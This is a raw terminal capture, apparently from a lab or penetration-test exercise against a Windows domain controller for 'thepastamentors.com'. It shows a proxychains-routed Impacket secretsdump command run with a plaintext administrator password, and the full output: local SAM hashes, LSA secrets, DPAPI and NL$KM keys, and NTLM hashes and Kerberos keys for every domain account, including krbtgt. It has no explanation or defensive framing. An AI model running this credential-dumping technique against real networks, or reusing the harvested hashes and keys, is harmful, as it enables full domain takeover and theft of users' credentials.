

```python
kali@kali ~> proxychains -q secretsdump.py administrator:'IjustpassedmyP!N!P!T!'@10.10.10.225 
Impacket v0.13.0.dev0+20241024.90011.835e175 - Copyright Fortra, LLC and its affiliated companies                                                                                                                                            
                                                                                                                                                                                                                                             
[*] Service RemoteRegistry is in stopped state                                                                                                                                                                                               
[*] Starting service RemoteRegistry                                                                                                                                                                                                          
[*] Target system bootKey: 0x736cef3f1e47a849bf2b35a5ca65eae6
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c3a807bd8e796ee86cbbf3b82ceb6320:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
THEPASTAMENTORS\TPM-DC$:aes256-cts-hmac-sha1-96:79b0d1229dd5b049e89283b314935a190322623fc087b8d5c9e3ccde8a9a3e08
THEPASTAMENTORS\TPM-DC$:aes128-cts-hmac-sha1-96:66572b242465321d572c7491772253d0
THEPASTAMENTORS\TPM-DC$:des-cbc-md5:75b6f86438ba8f51
THEPASTAMENTORS\TPM-DC$:plain_password_hex:d5f9121ead8900ab8928b68604f2f3fc9a0d897365be74c38a42bcd13bb6c98513fd07e805cc0265bdb113b6317b76aa831695b7686aa0522ed1ecf82894fc47126bbef683ab0c83136509e8210a82db12e7d302d4b5665d15d4d8fda14d81e4909d66aa2a9ebba5f9467ad00594abce0f21be7e23a2e1df9400a13636e226d0504a6076301e8eb5a11f2cfeb4b27f1a0bae803d6f0cd7aa001370eaf3b028fe693ade109ff6d8a060f4b17aa02a766a726917a8eae3d61a4555d096ed55ed6fcd49fea941065cf50b19324a81e606c6d3920df95d6e68361b2b2b3c8b5dc0854f2b40045e6cfb54ef489ee585e78101
THEPASTAMENTORS\TPM-DC$:aad3b435b51404eeaad3b435b51404ee:5bb1c6f1aaab93fd7bc49bd33e1e3879:::
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x5bc75e83d8c525c46071d4766a3f323eb9ba3002
dpapi_userkey:0xc61c03d96c72f42942330ff0b20b3d21b4d0dd78
[*] NL$KM 
 0000   7A 26 76 33 E7 2E 4C 7A  56 98 61 13 7A 10 0A A7   z&v3..LzV.a.z...
 0010   11 1C E2 BC 20 BA 2D FF  5F 65 9A C2 6E B5 E6 89   .... .-._e..n...
 0020   E2 F0 B4 16 A0 2D A7 2A  1F E2 07 96 01 2E C9 A1   .....-.*........
 0030   07 17 EF E9 BD 34 C2 00  7A D1 7C 8B 08 2E 04 CD   .....4..z.|.....
NL$KM:7a267633e72e4c7a569861137a100aa7111ce2bc20ba2dff5f659ac26eb5e689e2f0b416a02da72a1fe20796012ec9a10717efe9bd34c2007ad17c8b082e04cd
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:b6b50d4b18364681d5c8e4c6363a8bd5:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:5104c6f221ac3c4deaf32579d0ab1da1:::
thepastamentors.com\adriano:1104:aad3b435b51404eeaad3b435b51404ee:54635dfdc2ad868cd81febec0b00acb7:::
thepastamentors.com\alanzo:1105:aad3b435b51404eeaad3b435b51404ee:41b35bf6c6270e64a3f13ac100f375fe:::
thepastamentors.com\alessandra:1106:aad3b435b51404eeaad3b435b51404ee:41b35bf6c6270e64a3f13ac100f375fe:::
thepastamentors.com\mario:1107:aad3b435b51404eeaad3b435b51404ee:6c19ee4dfb14d8635f8cdaa7d0a306dc:::
thepastamentors.com\nicola:1108:aad3b435b51404eeaad3b435b51404ee:41b35bf6c6270e64a3f13ac100f375fe:::
thepastamentors.com\NoodleSVC:1110:aad3b435b51404eeaad3b435b51404ee:61b72e8b719abc52a18b006b33048279:::
giovanni:1114:aad3b435b51404eeaad3b435b51404ee:357111109ea0e90345b1b978a06b9ec3:::
leo:1115:aad3b435b51404eeaad3b435b51404ee:286e0efdd048890dd9f63c6bca10010e:::
thepastamentors.com\SophosSVC:1116:aad3b435b51404eeaad3b435b51404ee:906187867fabad38e66cd7b1dac67e7a:::
thepastamentors.com\CarbonBlackSVC:1117:aad3b435b51404eeaad3b435b51404ee:906187867fabad38e66cd7b1dac67e7a:::
thepastamentors.com\RecipeSVC:1118:aad3b435b51404eeaad3b435b51404ee:906187867fabad38e66cd7b1dac67e7a:::
thepastamentors.com\LinguineSVC:1119:aad3b435b51404eeaad3b435b51404ee:906187867fabad38e66cd7b1dac67e7a:::
thepastamentors.com\helpdesk:1120:aad3b435b51404eeaad3b435b51404ee:906248081bb8a39fa659b2575c2569ba:::
thepastamentors.com\fileshare:1121:aad3b435b51404eeaad3b435b51404ee:25eb9623bfc85128686e9270ca712bf5:::
thepastamentors.com\ferruccio:1122:aad3b435b51404eeaad3b435b51404ee:1b19b136b7f27225b899ba80aeea4a18:::
TPM-DC$:1000:aad3b435b51404eeaad3b435b51404ee:5bb1c6f1aaab93fd7bc49bd33e1e3879:::
SVC$:1111:aad3b435b51404eeaad3b435b51404ee:872b932d943004da73fa8b74519bb5a6:::
BYPASS$:1112:aad3b435b51404eeaad3b435b51404ee:578c4435f938d4ba9fbc23c23525f800:::
PASSBACK$:1113:aad3b435b51404eeaad3b435b51404ee:24f3fcf525e5bfb840055940a4ce3bbc:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:f1f1751b5a395d410c130ff581dacb1d8c8f4fef8be376ed79a623e5669bfdf8
Administrator:aes128-cts-hmac-sha1-96:9c72ee385f0602db1eebf1bdc335a62a
Administrator:des-cbc-md5:e651dcfeb0e937f2
krbtgt:aes256-cts-hmac-sha1-96:76bb52f94a33ce0e203881c97dd77e117c2c8d456e8a306a5c1b9814ed71f74e
krbtgt:aes128-cts-hmac-sha1-96:5dbeda50e5ce4bcccd666c10747ca411
krbtgt:des-cbc-md5:43dc70a826d06e8c
thepastamentors.com\adriano:aes256-cts-hmac-sha1-96:3a8abae9a55ef0f1a6fedc65dd39fb93ff395945b06c2ef2579b2b5356739545
thepastamentors.com\adriano:aes128-cts-hmac-sha1-96:2434734d07b5e258cf040e557883e028
thepastamentors.com\adriano:des-cbc-md5:d3703210d3a73ef4
thepastamentors.com\alanzo:aes256-cts-hmac-sha1-96:d2b95271492d78a2d966387014016e08b7f20209c454a43bf794c577a9c4442e
thepastamentors.com\alanzo:aes128-cts-hmac-sha1-96:fc936a155dbccd409a65c80e443c012e
thepastamentors.com\alanzo:des-cbc-md5:759b8073cd753ec1
thepastamentors.com\alessandra:aes256-cts-hmac-sha1-96:5277e75d0e7e8469a1bf0ed8ca3613bcea942893ce14d32164fa6809263ca9eb
thepastamentors.com\alessandra:aes128-cts-hmac-sha1-96:1de61d0ed3e103a3e72e973ebd129c3e
thepastamentors.com\alessandra:des-cbc-md5:a44c836db06723a8
thepastamentors.com\mario:aes256-cts-hmac-sha1-96:5a03be1665ebf9aed23b3cc9a6863c92559904177526badb923412fe81fa67f1
thepastamentors.com\mario:aes128-cts-hmac-sha1-96:ec3ab8366a1742cd04a9580e67d0ff46
thepastamentors.com\mario:des-cbc-md5:2f86bf70014a7f25
thepastamentors.com\nicola:aes256-cts-hmac-sha1-96:df43918d9a01b18c8c74b522ab199108565aa73bd60e0cf9b89ff5600fe9f78f
thepastamentors.com\nicola:aes128-cts-hmac-sha1-96:401edbab38c1f7319fce8b2e77f4dcb0
thepastamentors.com\nicola:des-cbc-md5:0de91f79e3e51002
thepastamentors.com\NoodleSVC:aes256-cts-hmac-sha1-96:4986a812325335ab95c7d51ee1f2ef23eb66eefbc947368b7b2ba352d9737a59
thepastamentors.com\NoodleSVC:aes128-cts-hmac-sha1-96:e5560547d4462dc28f1c6dc76a239921
thepastamentors.com\NoodleSVC:des-cbc-md5:a4983237dad0642f
giovanni:aes256-cts-hmac-sha1-96:5629b941bcbe5978acaea2aec6e65ae9106364e0f3577c411be2de2ebe447169
giovanni:aes128-cts-hmac-sha1-96:a4436d4a04cd58d1277ad1c23c8ae572
giovanni:des-cbc-md5:9897da20cbba4620
leo:aes256-cts-hmac-sha1-96:d4b5396eccac70c95af44f5bd5c9315d3e1d60a9f4d23ad57f22f9937967eff5
leo:aes128-cts-hmac-sha1-96:399de08b0025a1a21f4d1c7dd7caba5e
leo:des-cbc-md5:493e010bb3d55bdf
thepastamentors.com\SophosSVC:aes256-cts-hmac-sha1-96:971c1219a3cce37f5b9e02caea345a5c4448363c5ed0cfe0339e533ac44d0743
thepastamentors.com\SophosSVC:aes128-cts-hmac-sha1-96:25170012b4cc19fad1e4334bcf39eae5
thepastamentors.com\SophosSVC:des-cbc-md5:a41907cd5b346d57
thepastamentors.com\CarbonBlackSVC:aes256-cts-hmac-sha1-96:860e960132ff618a19ce839eeb18ad2a8d479a99fabe34bc5bb3e06be5dd754d
thepastamentors.com\CarbonBlackSVC:aes128-cts-hmac-sha1-96:d9d4ab65ab13dd388272f22fba60c6c0
thepastamentors.com\CarbonBlackSVC:des-cbc-md5:f1c4044fd66e26cd
thepastamentors.com\RecipeSVC:aes256-cts-hmac-sha1-96:20589f3bc0096e14915621c80893b579c2277a8712cb072ef1e8481851621cd6
thepastamentors.com\RecipeSVC:aes128-cts-hmac-sha1-96:fb9a13f6d9a9dcda077cae645e98cd07
thepastamentors.com\RecipeSVC:des-cbc-md5:32cd7a29044ce9a2
thepastamentors.com\LinguineSVC:aes256-cts-hmac-sha1-96:8f0ee9268288269411fafd512a90caf7372aac73b7b4f61450fe279369daf50b
thepastamentors.com\LinguineSVC:aes128-cts-hmac-sha1-96:dbf786002c2f72f12386a7699bc7d91e
thepastamentors.com\LinguineSVC:des-cbc-md5:252a57230e865802
thepastamentors.com\helpdesk:aes256-cts-hmac-sha1-96:5b3b4b4a88107ef9ca81e08f553ac34ddbf59f5afdc279f7b0cf302c3b8b6f83
thepastamentors.com\helpdesk:aes128-cts-hmac-sha1-96:73720bcb3e41640877230e5102861ec6
thepastamentors.com\helpdesk:des-cbc-md5:1ff2899e19409e5b
thepastamentors.com\fileshare:aes256-cts-hmac-sha1-96:18130e50fd28368c85564e163156dc9e66d366bf488847fb69f39f2bb28bab6a
thepastamentors.com\fileshare:aes128-cts-hmac-sha1-96:f7f8c0a5c2f90b2c7caa86ca214abfab
thepastamentors.com\fileshare:des-cbc-md5:dce33768f2f2df43
thepastamentors.com\ferruccio:aes256-cts-hmac-sha1-96:89db76efff143e1b5933e13d8249a08489e71a0e8005e69641a72d79ea65e29a
thepastamentors.com\ferruccio:aes128-cts-hmac-sha1-96:18bd322901ce281ab88fd8a7d9120870
thepastamentors.com\ferruccio:des-cbc-md5:01feea23a745e3f1
TPM-DC$:aes256-cts-hmac-sha1-96:79b0d1229dd5b049e89283b314935a190322623fc087b8d5c9e3ccde8a9a3e08
TPM-DC$:aes128-cts-hmac-sha1-96:66572b242465321d572c7491772253d0
TPM-DC$:des-cbc-md5:d38c98b61aa719d0
SVC$:aes256-cts-hmac-sha1-96:f429c43ee2c1724693b2bea71a8d0e1b257f68aa32cbec420b96b3359ff07e8c
SVC$:aes128-cts-hmac-sha1-96:75bdccdd6ec12b4508a8e200a3c8bf88
SVC$:des-cbc-md5:eff27a295845e03e
BYPASS$:aes256-cts-hmac-sha1-96:6cf340fdc03e7f1a120717b639b5c7011772ca4eec483b593ee8147f7953a2fa
BYPASS$:aes128-cts-hmac-sha1-96:24d6735d036728775e3d47687fa11e0e
BYPASS$:des-cbc-md5:62c1073d929202bc
PASSBACK$:aes256-cts-hmac-sha1-96:91d11e19cca2ba14d088b93d8a2e46442eb7c9268d250fe2cc05301e459f0ff8
PASSBACK$:aes128-cts-hmac-sha1-96:5951fd095d1d329f81743dff99e55255
PASSBACK$:des-cbc-md5:38d338da045b315d
[*] Cleaning up... 
[*] Stopping service RemoteRegistry
[-] SCMR SessionError: code: 0x41b - ERROR_DEPENDENT_SERVICES_RUNNING - A stop control has been sent to a service that other running services are dependent on.
[*] Cleaning up... 
[*] Stopping service RemoteRegistry
Exception ignored in: <function Registry.__del__ at 0x7f93c15d9120>
Traceback (most recent call last):
  File "/home/kali/.local/share/pipx/venvs/impacket/lib/python3.12/site-packages/impacket/winregistry.py", line 185, in __del__
  File "/home/kali/.local/share/pipx/venvs/impacket/lib/python3.12/site-packages/impacket/winregistry.py", line 182, in close
  File "/home/kali/.local/share/pipx/venvs/impacket/lib/python3.12/site-packages/impacket/examples/secretsdump.py", line 360, in close
  File "/home/kali/.local/share/pipx/venvs/impacket/lib/python3.12/site-packages/impacket/smbconnection.py", line 605, in closeFile
  File "/home/kali/.local/share/pipx/venvs/impacket/lib/python3.12/site-packages/impacket/smb3.py", line 1356, in close
  File "/home/kali/.local/share/pipx/venvs/impacket/lib/python3.12/site-packages/impacket/smb3.py", line 473, in sendSMB
  File "/home/kali/.local/share/pipx/venvs/impacket/lib/python3.12/site-packages/impacket/smb3.py", line 442, in signSMB
  File "/home/kali/.local/share/pipx/venvs/impacket/lib/python3.12/site-packages/impacket/crypto.py", line 150, in AES_CMAC
  File "/home/kali/.local/share/pipx/venvs/impacket/lib/python3.12/site-packages/Cryptodome/Cipher/AES.py", line 228, in new
KeyError: 'Cryptodome.Cipher.AES'
Exception ignored in: <function Registry.__del__ at 0x7f93c15d9120>
Traceback (most recent call last):
  File "/home/kali/.local/share/pipx/venvs/impacket/lib/python3.12/site-packages/impacket/winregistry.py", line 185, in __del__
  File "/home/kali/.local/share/pipx/venvs/impacket/lib/python3.12/site-packages/impacket/winregistry.py", line 182, in close
  File "/home/kali/.local/share/pipx/venvs/impacket/lib/python3.12/site-packages/impacket/examples/secretsdump.py", line 360, in close
  File "/home/kali/.local/share/pipx/venvs/impacket/lib/python3.12/site-packages/impacket/smbconnection.py", line 605, in closeFile
  File "/home/kali/.local/share/pipx/venvs/impacket/lib/python3.12/site-packages/impacket/smb3.py", line 1356, in close
  File "/home/kali/.local/share/pipx/venvs/impacket/lib/python3.12/site-packages/impacket/smb3.py", line 473, in sendSMB
  File "/home/kali/.local/share/pipx/venvs/impacket/lib/python3.12/site-packages/impacket/smb3.py", line 442, in signSMB
  File "/home/kali/.local/share/pipx/venvs/impacket/lib/python3.12/site-packages/impacket/crypto.py", line 150, in AES_CMAC
  File "/home/kali/.local/share/pipx/venvs/impacket/lib/python3.12/site-packages/Cryptodome/Cipher/AES.py", line 228, in new
KeyError: 'Cryptodome.Cipher.AES'

```



